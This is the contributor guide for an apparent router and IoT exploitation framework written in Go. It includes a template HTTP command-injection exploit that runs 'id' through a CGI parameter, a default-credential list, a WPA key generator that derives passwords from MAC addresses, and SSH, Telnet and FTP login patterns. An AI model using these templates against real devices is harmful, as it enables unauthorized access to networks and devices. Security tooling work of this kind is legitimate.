# Contributing to GoAccess

## Adding a New Exploit

### Step 1: Create the package

Create a directory under `exploits/<category>/<vendor>/<exploit_name>/`:

```bash
mkdir -p exploits/routers/myvendor/my_exploit
```

### Step 2: Implement the Exploit

Create `exploit.go`:

```go
package my_exploit

import (
    "strings"
    "time"

    "github.com/cookiengineer/goaccess/exploit"
    "github.com/cookiengineer/goaccess/interfaces"
    "github.com/cookiengineer/goaccess/protocols/http"
    "github.com/cookiengineer/goaccess/types"
)

type Exploit struct {
    httpClient *http.Client
}

func init() {
    exploit.Register(&Exploit{
        httpClient: http.NewClient(),
    })
}

func (e *Exploit) Info() *types.Info {
    return &types.Info{
        Name:        "MyVendor Device RCE",
        Description: "Exploits a command injection in MyVendor firmware.",
        Vendor:      "myvendor",
        DeviceType:  types.DeviceRouter,
        Models:      []string{"MODEL-1000", "MODEL-2000"},
        CVE:         []string{"CVE-2025-XXXX"},
        References:  []string{"https://example.com/advisory"},
    }
}

func (e *Exploit) Options() *types.Options {
    return &types.Options{
        Port:    80,
        Timeout: 10 * time.Second,
    }
}

func (e *Exploit) Protocol() types.Protocol { return types.ProtocolHTTP }

func (e *Exploit) Fingerprints() []*types.Fingerprint {
    return []*types.Fingerprint{
        {URL: "/cgi-bin/status", Method: "GET", Body: "MyVendor"},
    }
}

func (e *Exploit) Check(target string, opts *types.Options) (*types.VulnResult, error) {
    e.httpClient.Target = target
    e.httpClient.Port = opts.Port
    e.httpClient.Timeout = opts.Timeout

    resp, err := e.httpClient.Get("/cgi-bin/status", nil)
    if err != nil {
        return nil, err
    }

    if strings.Contains(string(resp.Body), "MyVendor") {
        return &types.VulnResult{
            Confirmed: true,
            Details:   "Device responds to status endpoint",
        }, nil
    }
    return nil, nil
}

func (e *Exploit) Run(target string, opts *types.Options) (*types.ExploitResult, error) {
    e.httpClient.Target = target
    e.httpClient.Port = opts.Port
    e.httpClient.Timeout = opts.Timeout

    cmd := "id"
    path := "/cgi-bin/exec?cmd=" + cmd
    resp, err := e.httpClient.Get(path, nil)
    if err != nil {
        return nil, err
    }

    return &types.ExploitResult{
        Success: true,
        Action:  "command_executed",
        Output:  string(resp.Body),
    }, nil
}

var _ interfaces.Exploit = (*Exploit)(nil)
```

### Step 3: Add interface compliance checks

Add compile-time interface checks at the bottom of `exploit.go`:

```go
var _ interfaces.Exploit = (*Exploit)(nil)

// If RCE exploit:
var _ interfaces.ExecuteExploit = (*Exploit)(nil)

// If credential disclosure exploit:
var _ interfaces.CredentialedExploit = (*Exploit)(nil)
```

### Step 4: Create tests

Create `exploit_test.go` in the same directory:

```go
package my_exploit

import (
    "net/http"
    "net/http/httptest"
    "testing"

    "github.com/cookiengineer/goaccess/types"
)

func TestExploit_Info(t *testing.T) {
    e := &Exploit{}
    info := e.Info()
    if info.Vendor != "myvendor" {
        t.Errorf("expected 'myvendor', got %q", info.Vendor)
    }
}

func TestExploit_Check_Vulnerable(t *testing.T) {
    srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Write([]byte("<html>MyVendor</html>"))
    }))
    defer srv.Close()

    e := &Exploit{httpClient: http.NewClient()}
    result, err := e.Check(srv.URL, &types.Options{Port: 80})
    if err != nil {
        t.Fatalf("Check() error: %v", err)
    }
    if result == nil || !result.Confirmed {
        t.Error("expected vulnerable")
    }
}

func TestExploit_Check_NotVulnerable(t *testing.T) {
    srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.WriteHeader(404)
    }))
    defer srv.Close()

    e := &Exploit{httpClient: http.NewClient()}
    result, err := e.Check(srv.URL, &types.Options{Port: 80})
    if err != nil {
        t.Fatalf("Check() error: %v", err)
    }
    if result != nil {
        t.Error("expected not vulnerable")
    }
}

func TestExploit_Protocol(t *testing.T) {
    e := &Exploit{}
    if e.Protocol() != types.ProtocolHTTP {
        t.Error("expected ProtocolHTTP")
    }
}
```

### Step 5: Register the package

Add a blank import to `exploits/imports.go`:

```go
_ "github.com/cookiengineer/goaccess/exploits/routers/myvendor/my_exploit"
```

### Step 6: Verify

```bash
go vet ./exploits/routers/myvendor/my_exploit/
go test ./exploits/routers/myvendor/my_exploit/
go build ./cmds/goaccess/
./bin/goaccess list exploits --vendor myvendor
```

## Adding a Credential Module

Create a file under `exploits/<category>/<vendor>/credentials/` with the service name:

```go
package credentials

import (
    "time"
    "github.com/cookiengineer/goaccess/exploit"
    "github.com/cookiengineer/goaccess/interfaces"
    "github.com/cookiengineer/goaccess/protocols/telnet"
    "github.com/cookiengineer/goaccess/types"
)

var MyVendorTelnetDefaults = []string{"admin:admin", "root:root", "user:user"}

type TelnetDefault struct { client *telnet.Client }

func init() { exploit.RegisterCredentials(&TelnetDefault{client: telnet.NewClient()}) }
// ... implement interfaces.CredentialsModule interface
```

## Adding a Password Generator

Implement `interfaces.PasswordGenerator` in the vendor's `credentials/` package:

```go
package credentials

import (
    "strings"
    "github.com/cookiengineer/goaccess/exploit"
    "github.com/cookiengineer/goaccess/interfaces"
    "github.com/cookiengineer/goaccess/types"
)

type MyVendorWPAKeyGenerator struct{}

func init() { exploit.RegisterPasswordGenerator(&MyVendorWPAKeyGenerator{}) }

func (g *MyVendorWPAKeyGenerator) Name() string {
    return "MyVendor Default WPA Key Generator"
}

func (g *MyVendorWPAKeyGenerator) Vendor() string {
    return "myvendor"
}

func (g *MyVendorWPAKeyGenerator) Generate(mac, serial, model string) []types.Credential {
    if mac == "" { return nil }
    hex := strings.ToUpper(strings.ReplaceAll(mac, ":", ""))
    if len(hex) < 8 { return nil }
    return []types.Credential{
        {Username: "admin", Password: hex[len(hex)-8:]},
    }
}

var _ interfaces.PasswordGenerator = (*MyVendorWPAKeyGenerator)(nil)
```

## Testing Requirements

| Test | Required | Description |
|------|----------|-------------|
| `Test_Info` | Yes | Verify Info() returns correct vendor, device type, models |
| `Test_Check_Vulnerable` | Yes | Verify Check() detects vulnerability with mock server |
| `Test_Check_NotVulnerable` | Yes | Verify Check() returns nil for non-vulnerable target |
| `Test_Run` | Yes | Verify Run() exploit behavior with mock server |
| `Test_Protocol` | Yes | Verify Protocol() returns correct protocol constant |
| `Test_InterfaceCompliance` | Yes | Compile-time interface satisfaction check |

## Protocol Client Patterns

### HTTP
```go
import protocolhttp "github.com/cookiengineer/goaccess/protocols/http"
// e.httpClient.Get("/path", nil)
// e.httpClient.Post("/path", []byte(body), headers)
// e.httpClient.SetBasicAuth(user, pass)
```

### TCP
```go
import "github.com/cookiengineer/goaccess/protocols/tcp"
// e.tcpClient.Connect()
// e.tcpClient.Send([]byte(data))
// data, _ := e.tcpClient.Recv(4096)
// defer e.tcpClient.Close()
```

### UDP
```go
import "github.com/cookiengineer/goaccess/protocols/udp"
// e.udpClient.Connect()
// e.udpClient.Send([]byte(data))
// data, _ := e.udpClient.Recv(4096)
```

### SSH
```go
import "github.com/cookiengineer/goaccess/protocols/ssh"
// e.sshClient.Login(user, pass)
// e.sshClient.LoginKey(user, privateKeyPEM)
// output, _ := e.sshClient.Execute("command")
```

### Telnet
```go
import "github.com/cookiengineer/goaccess/protocols/telnet"
// e.telnetClient.Login(user, pass) // returns bool
// e.telnetClient.Write(data)
// data, _ := e.telnetClient.Read(4096)
```

### FTP
```go
import "github.com/cookiengineer/goaccess/protocols/ftp"
// e.ftpClient.Target = target
// e.ftpClient.Port = 21
// e.ftpClient.Login(user, pass)
// files, _ := e.ftpClient.List("/")
```

### SNMP
```go
import "github.com/cookiengineer/goaccess/protocols/snmp"
// e.snmpClient.Community = "public"
// e.snmpClient.Get("1.3.6.1.2.1.1.1.0")
```

## Code Conventions

1. **Package name**: Use snake_case matching the directory name
2. **Exploit struct name**: Always `Exploit` (uppercase, exported)
3. **Creds module struct name**: `ServiceDefault` (e.g., `TelnetDefault`, `HTTPFormDefault`)
4. **Generator struct name**: `VendorNameGenerator` (e.g., `DLinkWPAGenerator`)
5. **Registration**: Call `exploit.Register()`, `exploit.RegisterCredentials()`, or `exploit.RegisterPasswordGenerator()` in `init()`
6. **Protocol client**: Embed the protocol client as a field named after the protocol (e.g., `httpClient *http.Client`)
7. **Options**: Return a fresh `*types.Options` with default Port and Timeout. Do not reuse.
8. **Zero dependencies**: Exploit packages may only depend on `types/`, `interfaces/`, `protocols/<proto>/`, `exploit/` (for registration), and stdlib.
9. **No platform-specific code**: Avoid `//go:build` tags. Use stdlib abstractions.
10. **Self-contained**: A package can be copied out and used standalone with only its required protocol client.
